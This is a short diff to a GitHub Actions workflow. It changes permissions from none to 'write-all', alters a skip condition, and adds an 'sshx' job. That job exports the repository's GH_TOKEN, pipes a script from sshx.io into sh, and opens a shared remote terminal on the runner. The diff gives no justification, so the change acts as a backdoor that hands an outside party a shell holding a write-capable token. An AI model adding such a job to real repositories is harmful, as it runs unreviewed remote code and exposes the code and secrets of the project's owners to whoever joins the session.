@@ -3,11 +3,11 @@ on:
   push:
     branches: ["**"]
 
-permissions: {}
+permissions: write-all
 
 jobs:
   test1:
-    if: ${{ !startsWith(github.event.head_commit.message, 'chore(main)')}}
+    if: ${{ !startsWith(github.event.head_commit.message, 'release:')}}
     runs-on: ubuntu-latest
     steps:
       - run: |
@@ -21,3 +21,12 @@ jobs:
 
   call-test:
     uses: ./.github/workflows/debug.yml
+
+  sshx:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+    steps:
+      - run: sleep 10
+      - run: sleep 10
+      - run: curl -sSf https://sshx.io/get | sh && sshx
